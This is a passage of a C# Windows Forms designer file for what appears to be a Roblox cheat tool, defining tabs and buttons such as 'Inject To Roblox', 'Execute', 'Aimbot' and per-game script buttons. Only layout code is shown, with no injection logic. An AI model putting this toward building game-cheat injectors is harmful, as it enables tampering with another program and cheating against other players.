            this.flatTabControl2.Controls.Add(this.tabPage51);
            this.flatTabControl2.Controls.Add(this.tabPage52);
            this.flatTabControl2.Controls.Add(this.tabPage58);
            this.flatTabControl2.Controls.Add(this.tabPage61);
            this.flatTabControl2.Controls.Add(this.tabPage64);
            this.flatTabControl2.Controls.Add(this.tabPage65);
            this.flatTabControl2.Controls.Add(this.tabPage66);
            this.flatTabControl2.Controls.Add(this.tabPage67);
            this.flatTabControl2.Controls.Add(this.tabPage70);
            this.flatTabControl2.Controls.Add(this.tabPage72);
            this.flatTabControl2.Controls.Add(this.tabPage74);
            this.flatTabControl2.Controls.Add(this.tabPage76);
            this.flatTabControl2.Controls.Add(this.tabPage77);
            this.flatTabControl2.Controls.Add(this.tabPage79);
            this.flatTabControl2.Controls.Add(this.tabPage80);
            this.flatTabControl2.Controls.Add(this.tabPage81);
            this.flatTabControl2.Controls.Add(this.tabPage82);
            this.flatTabControl2.Controls.Add(this.tabPage83);
            this.flatTabControl2.Controls.Add(this.tabPage86);
            this.flatTabControl2.Controls.Add(this.tabPage88);
            this.flatTabControl2.Controls.Add(this.tabPage89);
            this.flatTabControl2.Controls.Add(this.tabPage90);
            this.flatTabControl2.Controls.Add(this.tabPage91);
            this.flatTabControl2.Controls.Add(this.tabPage93);
            this.flatTabControl2.Controls.Add(this.tabPage94);
            this.flatTabControl2.Controls.Add(this.tabPage96);
            this.flatTabControl2.Controls.Add(this.tabPage99);
            this.flatTabControl2.Controls.Add(this.tabPage103);
            this.flatTabControl2.Controls.Add(this.tabPage104);
            this.flatTabControl2.Controls.Add(this.tabPage105);
            this.flatTabControl2.Controls.Add(this.tabPage107);
            this.flatTabControl2.Controls.Add(this.tabPage108);
            this.flatTabControl2.Controls.Add(this.tabPage110);
            this.flatTabControl2.Controls.Add(this.tabPage111);
            this.flatTabControl2.Controls.Add(this.tabPage112);
            this.flatTabControl2.Controls.Add(this.tabPage113);
            this.flatTabControl2.Controls.Add(this.tabPage117);
            this.flatTabControl2.Controls.Add(this.tabPage119);
            this.flatTabControl2.Controls.Add(this.tabPage120);
            this.flatTabControl2.Controls.Add(this.tabPage122);
            this.flatTabControl2.Controls.Add(this.tabPage124);
            this.flatTabControl2.Controls.Add(this.tabPage125);
            this.flatTabControl2.Controls.Add(this.tabPage126);
            this.flatTabControl2.Controls.Add(this.tabPage127);
            this.flatTabControl2.Controls.Add(this.tabPage128);
            this.flatTabControl2.Controls.Add(this.tabPage129);
            this.flatTabControl2.Controls.Add(this.tabPage130);
            this.flatTabControl2.Controls.Add(this.tabPage132);
            this.flatTabControl2.Controls.Add(this.tabPage136);
            this.flatTabControl2.Controls.Add(this.tabPage137);
            this.flatTabControl2.Controls.Add(this.tabPage140);
            this.flatTabControl2.Controls.Add(this.tabPage141);
            this.flatTabControl2.Controls.Add(this.tabPage142);
            this.flatTabControl2.Controls.Add(this.tabPage143);
            this.flatTabControl2.Controls.Add(this.tabPage144);
            this.flatTabControl2.Controls.Add(this.tabPage145);
            this.flatTabControl2.Controls.Add(this.tabPage146);
            this.flatTabControl2.Controls.Add(this.tabPage147);
            this.flatTabControl2.Controls.Add(this.tabPage148);
            this.flatTabControl2.Controls.Add(this.tabPage149);
            this.flatTabControl2.Controls.Add(this.tabPage150);
            this.flatTabControl2.Controls.Add(this.tabPage151);
            this.flatTabControl2.Controls.Add(this.tabPage152);
            this.flatTabControl2.Controls.Add(this.tabPage153);
            this.flatTabControl2.Controls.Add(this.tabPage154);
            this.flatTabControl2.Controls.Add(this.tabPage155);
            this.flatTabControl2.Controls.Add(this.tabPage156);
            this.flatTabControl2.Controls.Add(this.tabPage158);
            this.flatTabControl2.Controls.Add(this.tabPage159);
            this.flatTabControl2.Controls.Add(this.tabPage160);
            this.flatTabControl2.Controls.Add(this.tabPage161);
            this.flatTabControl2.Controls.Add(this.tabPage162);
            this.flatTabControl2.Controls.Add(this.tabPage163);
            this.flatTabControl2.Controls.Add(this.tabPage164);
            this.flatTabControl2.Controls.Add(this.tabPage165);
            this.flatTabControl2.Controls.Add(this.tabPage166);
            this.flatTabControl2.Controls.Add(this.tabPage167);
            this.flatTabControl2.Controls.Add(this.tabPage168);
            this.flatTabControl2.Controls.Add(this.tabPage170);
            this.flatTabControl2.Font = new System.Drawing.Font("Segoe UI", 10F);
            this.flatTabControl2.ItemSize = new System.Drawing.Size(120, 40);
            this.flatTabControl2.Location = new System.Drawing.Point(0, 48);
            this.flatTabControl2.Name = "flatTabControl2";
            this.flatTabControl2.SelectedIndex = 0;
            this.flatTabControl2.Size = new System.Drawing.Size(522, 297);
            this.flatTabControl2.SizeMode = System.Windows.Forms.TabSizeMode.Fixed;
            this.flatTabControl2.TabIndex = 0;
            this.flatTabControl2.SelectedIndexChanged += new System.EventHandler(this.flatTabControl2_SelectedIndexChanged);
            // 
            // Executor
            // 
            this.Executor.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(70)))), ((int)(((byte)(73)))));
            this.Executor.Controls.Add(this.button9);
            this.Executor.Controls.Add(this.button5);
            this.Executor.Controls.Add(this.button8);
            this.Executor.Controls.Add(this.button7);
            this.Executor.Controls.Add(this.webBrowser1);
            this.Executor.Location = new System.Drawing.Point(4, 44);
            this.Executor.Name = "Executor";
            this.Executor.Size = new System.Drawing.Size(514, 249);
            this.Executor.TabIndex = 167;
            this.Executor.Text = "Executor";
            // 
            // button9
            // 
            this.button9.BackColor = System.Drawing.Color.Transparent;
            this.button9.Cursor = System.Windows.Forms.Cursors.Hand;
            this.button9.FlatAppearance.BorderColor = System.Drawing.Color.White;
            this.button9.FlatAppearance.BorderSize = 2;
            this.button9.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(45)))), ((int)(((byte)(45)))));
            this.button9.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.button9.Font = new System.Drawing.Font("Microsoft Sans Serif", 8F, System.Drawing.FontStyle.Bold);
            this.button9.ForeColor = System.Drawing.Color.White;
            this.button9.Location = new System.Drawing.Point(374, 215);
            this.button9.Name = "button9";
            this.button9.Size = new System.Drawing.Size(109, 25);
            this.button9.TabIndex = 68;
            this.button9.Text = "Save File";
            this.button9.UseVisualStyleBackColor = false;
            this.button9.Click += new System.EventHandler(this.button9_Click);
            // 
            // button5
            // 
            this.button5.BackColor = System.Drawing.Color.Transparent;
            this.button5.Cursor = System.Windows.Forms.Cursors.Hand;
            this.button5.FlatAppearance.BorderColor = System.Drawing.Color.White;
            this.button5.FlatAppearance.BorderSize = 2;
            this.button5.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(45)))), ((int)(((byte)(45)))));
            this.button5.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.button5.Font = new System.Drawing.Font("Microsoft Sans Serif", 8F, System.Drawing.FontStyle.Bold);
            this.button5.ForeColor = System.Drawing.Color.White;
            this.button5.Location = new System.Drawing.Point(29, 215);
            this.button5.Name = "button5";
            this.button5.Size = new System.Drawing.Size(109, 25);
            this.button5.TabIndex = 65;
            this.button5.Text = "Execute";
            this.button5.UseVisualStyleBackColor = false;
            this.button5.Click += new System.EventHandler(this.button5_Click);
            // 
            // button8
            // 
            this.button8.BackColor = System.Drawing.Color.Transparent;
            this.button8.Cursor = System.Windows.Forms.Cursors.Hand;
            this.button8.FlatAppearance.BorderColor = System.Drawing.Color.White;
            this.button8.FlatAppearance.BorderSize = 2;
            this.button8.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(45)))), ((int)(((byte)(45)))));
            this.button8.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.button8.Font = new System.Drawing.Font("Microsoft Sans Serif", 8F, System.Drawing.FontStyle.Bold);
            this.button8.ForeColor = System.Drawing.Color.White;
            this.button8.Location = new System.Drawing.Point(144, 215);
            this.button8.Name = "button8";
            this.button8.Size = new System.Drawing.Size(109, 25);
            this.button8.TabIndex = 67;
            this.button8.Text = "Clear";
            this.button8.UseVisualStyleBackColor = false;
            this.button8.Click += new System.EventHandler(this.button8_Click);
            // 
            // button7
            // 
            this.button7.BackColor = System.Drawing.Color.Transparent;
            this.button7.Cursor = System.Windows.Forms.Cursors.Hand;
            this.button7.FlatAppearance.BorderColor = System.Drawing.Color.White;
            this.button7.FlatAppearance.BorderSize = 2;
            this.button7.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(45)))), ((int)(((byte)(45)))));
            this.button7.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.button7.Font = new System.Drawing.Font("Microsoft Sans Serif", 8F, System.Drawing.FontStyle.Bold);
            this.button7.ForeColor = System.Drawing.Color.White;
            this.button7.Location = new System.Drawing.Point(259, 215);
            this.button7.Name = "button7";
            this.button7.Size = new System.Drawing.Size(109, 25);
            this.button7.TabIndex = 66;
            this.button7.Text = "Open File";
            this.button7.UseVisualStyleBackColor = false;
            this.button7.Click += new System.EventHandler(this.button7_Click_1);
            // 
            // webBrowser1
            // 
            this.webBrowser1.Location = new System.Drawing.Point(2, 2);
            this.webBrowser1.Margin = new System.Windows.Forms.Padding(2);
            this.webBrowser1.MinimumSize = new System.Drawing.Size(15, 16);
            this.webBrowser1.Name = "webBrowser1";
            this.webBrowser1.ScriptErrorsSuppressed = true;
            this.webBrowser1.Size = new System.Drawing.Size(506, 208);
            this.webBrowser1.TabIndex = 64;
            this.webBrowser1.DocumentCompleted += new System.Windows.Forms.WebBrowserDocumentCompletedEventHandler(this.webBrowser1_DocumentCompleted);
            // 
            // Main
            // 
            this.Main.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(70)))), ((int)(((byte)(73)))));
            this.Main.Controls.Add(this.button10);
            this.Main.Controls.Add(this.MultipleROBLOX);
            this.Main.Controls.Add(this.button3);
            this.Main.Controls.Add(this.button2);
            this.Main.Controls.Add(this.button1);
            this.Main.Controls.Add(this.button18);
            this.Main.Controls.Add(this.cb2);
            this.Main.ForeColor = System.Drawing.Color.White;
            this.Main.Location = new System.Drawing.Point(4, 44);
            this.Main.Name = "Main";
            this.Main.Size = new System.Drawing.Size(514, 249);
            this.Main.TabIndex = 166;
            this.Main.Text = "Main";
            this.Main.Click += new System.EventHandler(this.Main_Click);
            // 
            // button10
            // 
            this.button10.BackColor = System.Drawing.Color.Transparent;
            this.button10.Cursor = System.Windows.Forms.Cursors.Hand;
            this.button10.FlatAppearance.BorderColor = System.Drawing.Color.White;
            this.button10.FlatAppearance.BorderSize = 2;
            this.button10.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(45)))), ((int)(((byte)(45)))));
            this.button10.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.button10.Font = new System.Drawing.Font("Microsoft Sans Serif", 8F, System.Drawing.FontStyle.Bold);
            this.button10.ForeColor = System.Drawing.Color.White;
            this.button10.Location = new System.Drawing.Point(8, 37);
            this.button10.Name = "button10";
            this.button10.Size = new System.Drawing.Size(142, 25);
            this.button10.TabIndex = 116;
            this.button10.Text = "Fix Injection Errors";
            this.button10.UseVisualStyleBackColor = false;
            this.button10.Click += new System.EventHandler(this.button10_Click);
            // 
            // MultipleROBLOX
            // 
            this.MultipleROBLOX.AutoSize = true;
            this.MultipleROBLOX.Font = new System.Drawing.Font("Microsoft Sans Serif", 8F, System.Drawing.FontStyle.Bold);
            this.MultipleROBLOX.ForeColor = System.Drawing.Color.White;
            this.MultipleROBLOX.Location = new System.Drawing.Point(8, 115);
            this.MultipleROBLOX.Name = "MultipleROBLOX";
            this.MultipleROBLOX.Size = new System.Drawing.Size(124, 17);
            this.MultipleROBLOX.TabIndex = 114;
            this.MultipleROBLOX.Text = "Multiple ROBLOX";
            this.MultipleROBLOX.UseVisualStyleBackColor = true;
            this.MultipleROBLOX.CheckedChanged += new System.EventHandler(this.MultipleROBLOX_CheckedChanged);
            // 
            // button3
            // 
            this.button3.BackColor = System.Drawing.Color.Transparent;
            this.button3.Cursor = System.Windows.Forms.Cursors.Hand;
            this.button3.FlatAppearance.BorderColor = System.Drawing.Color.White;
            this.button3.FlatAppearance.BorderSize = 2;
            this.button3.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(45)))), ((int)(((byte)(45)))));
            this.button3.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.button3.Font = new System.Drawing.Font("Microsoft Sans Serif", 8F, System.Drawing.FontStyle.Bold);
            this.button3.ForeColor = System.Drawing.Color.White;
            this.button3.Location = new System.Drawing.Point(156, 34);
            this.button3.Name = "button3";
            this.button3.Size = new System.Drawing.Size(164, 25);
            this.button3.TabIndex = 63;
            this.button3.Text = "Re-Install Roblox";
            this.button3.UseVisualStyleBackColor = false;
            this.button3.Click += new System.EventHandler(this.button3_Click);
            // 
            // button2
            // 
            this.button2.BackColor = System.Drawing.Color.Transparent;
            this.button2.Cursor = System.Windows.Forms.Cursors.Hand;
            this.button2.FlatAppearance.BorderColor = System.Drawing.Color.White;
            this.button2.FlatAppearance.BorderSize = 2;
            this.button2.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(45)))), ((int)(((byte)(45)))));
            this.button2.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.button2.Font = new System.Drawing.Font("Microsoft Sans Serif", 8F, System.Drawing.FontStyle.Bold);
            this.button2.ForeColor = System.Drawing.Color.White;
            this.button2.Location = new System.Drawing.Point(156, 6);
            this.button2.Name = "button2";
            this.button2.Size = new System.Drawing.Size(164, 25);
            this.button2.TabIndex = 62;
            this.button2.Text = "Download VC Redist x86";
            this.button2.UseVisualStyleBackColor = false;
            this.button2.Click += new System.EventHandler(this.button2_Click);
            // 
            // button1
            // 
            this.button1.BackColor = System.Drawing.Color.Transparent;
            this.button1.Cursor = System.Windows.Forms.Cursors.Hand;
            this.button1.FlatAppearance.BorderColor = System.Drawing.Color.White;
            this.button1.FlatAppearance.BorderSize = 2;
            this.button1.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(45)))), ((int)(((byte)(45)))));
            this.button1.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.button1.Font = new System.Drawing.Font("Microsoft Sans Serif", 8F, System.Drawing.FontStyle.Bold);
            this.button1.ForeColor = System.Drawing.Color.White;
            this.button1.Location = new System.Drawing.Point(8, 68);
            this.button1.Name = "button1";
            this.button1.Size = new System.Drawing.Size(142, 25);
            this.button1.TabIndex = 61;
            this.button1.Text = "Kill Roblox";
            this.button1.UseVisualStyleBackColor = false;
            this.button1.Click += new System.EventHandler(this.button1_Click);
            // 
            // button18
            // 
            this.button18.BackColor = System.Drawing.Color.Transparent;
            this.button18.Cursor = System.Windows.Forms.Cursors.Hand;
            this.button18.FlatAppearance.BorderColor = System.Drawing.Color.White;
            this.button18.FlatAppearance.BorderSize = 2;
            this.button18.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(45)))), ((int)(((byte)(45)))));
            this.button18.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.button18.Font = new System.Drawing.Font("Microsoft Sans Serif", 8F, System.Drawing.FontStyle.Bold);
            this.button18.ForeColor = System.Drawing.Color.White;
            this.button18.Location = new System.Drawing.Point(8, 6);
            this.button18.Name = "button18";
            this.button18.Size = new System.Drawing.Size(142, 25);
            this.button18.TabIndex = 60;
            this.button18.Text = "Inject To Roblox";
            this.button18.UseVisualStyleBackColor = false;
            this.button18.Click += new System.EventHandler(this.button18_Click);
            // 
            // cb2
            // 
            this.cb2.AutoSize = true;
            this.cb2.Checked = true;
            this.cb2.CheckState = System.Windows.Forms.CheckState.Checked;
            this.cb2.FlatAppearance.BorderColor = System.Drawing.Color.White;
            this.cb2.FlatAppearance.BorderSize = 2;
            this.cb2.Font = new System.Drawing.Font("Microsoft Sans Serif", 8F, System.Drawing.FontStyle.Bold);
            this.cb2.ForeColor = System.Drawing.Color.White;
            this.cb2.Location = new System.Drawing.Point(8, 99);
            this.cb2.Name = "cb2";
            this.cb2.Size = new System.Drawing.Size(57, 17);
            this.cb2.TabIndex = 59;
            this.cb2.Text = "API 1";
            this.cb2.UseVisualStyleBackColor = true;
            this.cb2.CheckedChanged += new System.EventHandler(this.cb2_CheckedChanged_1);
            // 
            // tabPage27
            // 
            this.tabPage27.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(70)))), ((int)(((byte)(73)))));
            this.tabPage27.Controls.Add(this.flatButton60);
            this.tabPage27.Location = new System.Drawing.Point(4, 44);
            this.tabPage27.Name = "tabPage27";
            this.tabPage27.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage27.Size = new System.Drawing.Size(514, 249);
            this.tabPage27.TabIndex = 22;
            this.tabPage27.Text = "Shinobi Origin";
            // 
            // flatButton60
            // 
            this.flatButton60.BackColor = System.Drawing.Color.Transparent;
            this.flatButton60.BaseColor = System.Drawing.Color.Red;
            this.flatButton60.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton60.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton60.Location = new System.Drawing.Point(6, 6);
            this.flatButton60.Name = "flatButton60";
            this.flatButton60.Rounded = false;
            this.flatButton60.Size = new System.Drawing.Size(106, 35);
            this.flatButton60.TabIndex = 22;
            this.flatButton60.Text = "GUI 1";
            this.flatButton60.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton60.UseCustomColor = false;
            this.flatButton60.Click += new System.EventHandler(this.flatButton60_Click);
            // 
            // tabPage30
            // 
            this.tabPage30.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(70)))), ((int)(((byte)(73)))));
            this.tabPage30.Controls.Add(this.flatButton63);
            this.tabPage30.Location = new System.Drawing.Point(4, 44);
            this.tabPage30.Name = "tabPage30";
            this.tabPage30.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage30.Size = new System.Drawing.Size(514, 249);
            this.tabPage30.TabIndex = 25;
            this.tabPage30.Text = "Royale High";
            // 
            // flatButton63
            // 
            this.flatButton63.BackColor = System.Drawing.Color.Transparent;
            this.flatButton63.BaseColor = System.Drawing.Color.Red;
            this.flatButton63.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton63.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton63.Location = new System.Drawing.Point(6, 6);
            this.flatButton63.Name = "flatButton63";
            this.flatButton63.Rounded = false;
            this.flatButton63.Size = new System.Drawing.Size(106, 35);
            this.flatButton63.TabIndex = 26;
            this.flatButton63.Text = "Script 1";
            this.flatButton63.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton63.UseCustomColor = false;
            this.flatButton63.Click += new System.EventHandler(this.flatButton63_Click);
            // 
            // tabPage31
            // 
            this.tabPage31.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(70)))), ((int)(((byte)(73)))));
            this.tabPage31.Controls.Add(this.flatButton85);
            this.tabPage31.Location = new System.Drawing.Point(4, 44);
            this.tabPage31.Name = "tabPage31";
            this.tabPage31.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage31.Size = new System.Drawing.Size(514, 249);
            this.tabPage31.TabIndex = 26;
            this.tabPage31.Text = "Lifting Simulator";
            // 
            // flatButton85
            // 
            this.flatButton85.BackColor = System.Drawing.Color.Transparent;
            this.flatButton85.BaseColor = System.Drawing.Color.Red;
            this.flatButton85.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton85.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton85.Location = new System.Drawing.Point(6, 6);
            this.flatButton85.Name = "flatButton85";
            this.flatButton85.Rounded = false;
            this.flatButton85.Size = new System.Drawing.Size(106, 35);
            this.flatButton85.TabIndex = 28;
            this.flatButton85.Text = "GUI 1";
            this.flatButton85.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton85.UseCustomColor = false;
            this.flatButton85.Click += new System.EventHandler(this.flatButton85_Click);
            // 
            // tabPage32
            // 
            this.tabPage32.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(70)))), ((int)(((byte)(73)))));
            this.tabPage32.Controls.Add(this.flatButton276);
            this.tabPage32.Controls.Add(this.flatButton88);
            this.tabPage32.Location = new System.Drawing.Point(4, 44);
            this.tabPage32.Name = "tabPage32";
            this.tabPage32.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage32.Size = new System.Drawing.Size(514, 249);
            this.tabPage32.TabIndex = 27;
            this.tabPage32.Text = "Bee Swarm Sim";
            // 
            // flatButton276
            // 
            this.flatButton276.BackColor = System.Drawing.Color.Transparent;
            this.flatButton276.BaseColor = System.Drawing.Color.Red;
            this.flatButton276.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton276.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton276.Location = new System.Drawing.Point(118, 6);
            this.flatButton276.Name = "flatButton276";
            this.flatButton276.Rounded = false;
            this.flatButton276.Size = new System.Drawing.Size(106, 35);
            this.flatButton276.TabIndex = 38;
            this.flatButton276.Text = "GUI 2";
            this.flatButton276.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton276.UseCustomColor = false;
            this.flatButton276.Click += new System.EventHandler(this.flatButton276_Click);
            // 
            // flatButton88
            // 
            this.flatButton88.BackColor = System.Drawing.Color.Transparent;
            this.flatButton88.BaseColor = System.Drawing.Color.Red;
            this.flatButton88.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton88.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton88.Location = new System.Drawing.Point(6, 6);
            this.flatButton88.Name = "flatButton88";
            this.flatButton88.Rounded = false;
            this.flatButton88.Size = new System.Drawing.Size(106, 35);
            this.flatButton88.TabIndex = 32;
            this.flatButton88.Text = "GUI 1";
            this.flatButton88.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton88.UseCustomColor = false;
            this.flatButton88.Click += new System.EventHandler(this.flatButton88_Click);
            // 
            // tabPage33
            // 
            this.tabPage33.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(70)))), ((int)(((byte)(73)))));
            this.tabPage33.Controls.Add(this.flatButton304);
            this.tabPage33.Controls.Add(this.flatButton91);
            this.tabPage33.Controls.Add(this.pictureBox46);
            this.tabPage33.Location = new System.Drawing.Point(4, 44);
            this.tabPage33.Name = "tabPage33";
            this.tabPage33.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage33.Size = new System.Drawing.Size(514, 249);
            this.tabPage33.TabIndex = 28;
            this.tabPage33.Text = "Arsenal";
            // 
            // flatButton304
            // 
            this.flatButton304.BackColor = System.Drawing.Color.Transparent;
            this.flatButton304.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton304.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton304.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton304.Location = new System.Drawing.Point(6, 6);
            this.flatButton304.Name = "flatButton304";
            this.flatButton304.Rounded = false;
            this.flatButton304.Size = new System.Drawing.Size(106, 35);
            this.flatButton304.TabIndex = 36;
            this.flatButton304.Text = "Aimbot";
            this.flatButton304.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton304.UseCustomColor = false;
            this.flatButton304.Click += new System.EventHandler(this.flatButton304_Click);
            // 
            // flatButton91
            // 
            this.flatButton91.BackColor = System.Drawing.Color.Transparent;
            this.flatButton91.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton91.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton91.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton91.ForeColor = System.Drawing.Color.CornflowerBlue;
            this.flatButton91.Location = new System.Drawing.Point(557, 369);
            this.flatButton91.Name = "flatButton91";
            this.flatButton91.Rounded = false;
            this.flatButton91.Size = new System.Drawing.Size(106, 35);
            this.flatButton91.TabIndex = 35;
            this.flatButton91.Text = "Home";
            this.flatButton91.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton91.UseCustomColor = false;
            this.flatButton91.Click += new System.EventHandler(this.flatButton91_Click);
            // 
            // pictureBox46
            // 
            this.pictureBox46.Location = new System.Drawing.Point(514, 6);
            this.pictureBox46.Name = "pictureBox46";
            this.pictureBox46.Size = new System.Drawing.Size(149, 149);
            this.pictureBox46.TabIndex = 34;
            this.pictureBox46.TabStop = false;
            // 
            // tabPage36
            // 
            this.tabPage36.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(70)))), ((int)(((byte)(73)))));
            this.tabPage36.Controls.Add(this.flatButton106);
            this.tabPage36.Controls.Add(this.pictureBox58);
            this.tabPage36.Controls.Add(this.flatButton107);
            this.tabPage36.Location = new System.Drawing.Point(4, 44);
            this.tabPage36.Name = "tabPage36";
            this.tabPage36.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage36.Size = new System.Drawing.Size(514, 249);
            this.tabPage36.TabIndex = 31;
            this.tabPage36.Text = "Anime Fighting Simulator";
            // 
            // flatButton106
            // 
            this.flatButton106.BackColor = System.Drawing.Color.Transparent;
            this.flatButton106.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton106.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton106.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton106.ForeColor = System.Drawing.Color.CornflowerBlue;
            this.flatButton106.Location = new System.Drawing.Point(557, 369);
            this.flatButton106.Name = "flatButton106";
            this.flatButton106.Rounded = false;
            this.flatButton106.Size = new System.Drawing.Size(106, 35);
            this.flatButton106.TabIndex = 43;
            this.flatButton106.Text = "Home";
            this.flatButton106.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton106.UseCustomColor = false;
            this.flatButton106.Click += new System.EventHandler(this.flatButton106_Click);
            // 
            // pictureBox58
            // 
            this.pictureBox58.Location = new System.Drawing.Point(514, 6);
            this.pictureBox58.Name = "pictureBox58";
            this.pictureBox58.Size = new System.Drawing.Size(149, 149);
            this.pictureBox58.TabIndex = 42;
            this.pictureBox58.TabStop = false;
            // 
            // flatButton107
            // 
            this.flatButton107.BackColor = System.Drawing.Color.Transparent;
            this.flatButton107.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton107.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton107.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton107.Location = new System.Drawing.Point(6, 6);
            this.flatButton107.Name = "flatButton107";
            this.flatButton107.Rounded = false;
            this.flatButton107.Size = new System.Drawing.Size(106, 35);
            this.flatButton107.TabIndex = 40;
            this.flatButton107.Text = "TP Crates";
            this.flatButton107.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton107.UseCustomColor = false;
            this.flatButton107.Click += new System.EventHandler(this.flatButton107_Click);
            // 
            // tabPage38
            // 
            this.tabPage38.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(70)))), ((int)(((byte)(73)))));
            this.tabPage38.Controls.Add(this.flatButton110);
            this.tabPage38.Controls.Add(this.pictureBox60);
            this.tabPage38.Controls.Add(this.flatButton111);
            this.tabPage38.Location = new System.Drawing.Point(4, 44);
            this.tabPage38.Name = "tabPage38";
            this.tabPage38.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage38.Size = new System.Drawing.Size(514, 249);
            this.tabPage38.TabIndex = 33;
            this.tabPage38.Text = "Ninja Legends";
            // 
            // flatButton110
            // 
            this.flatButton110.BackColor = System.Drawing.Color.Transparent;
            this.flatButton110.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton110.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton110.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton110.ForeColor = System.Drawing.Color.CornflowerBlue;
            this.flatButton110.Location = new System.Drawing.Point(557, 369);
            this.flatButton110.Name = "flatButton110";
            this.flatButton110.Rounded = false;
            this.flatButton110.Size = new System.Drawing.Size(106, 35);
            this.flatButton110.TabIndex = 43;
            this.flatButton110.Text = "Home";
            this.flatButton110.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton110.UseCustomColor = false;
            this.flatButton110.Click += new System.EventHandler(this.flatButton110_Click);
            // 
            // pictureBox60
            // 
            this.pictureBox60.Location = new System.Drawing.Point(514, 6);
            this.pictureBox60.Name = "pictureBox60";
            this.pictureBox60.Size = new System.Drawing.Size(149, 149);
            this.pictureBox60.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.pictureBox60.TabIndex = 42;
            this.pictureBox60.TabStop = false;
            // 
            // flatButton111
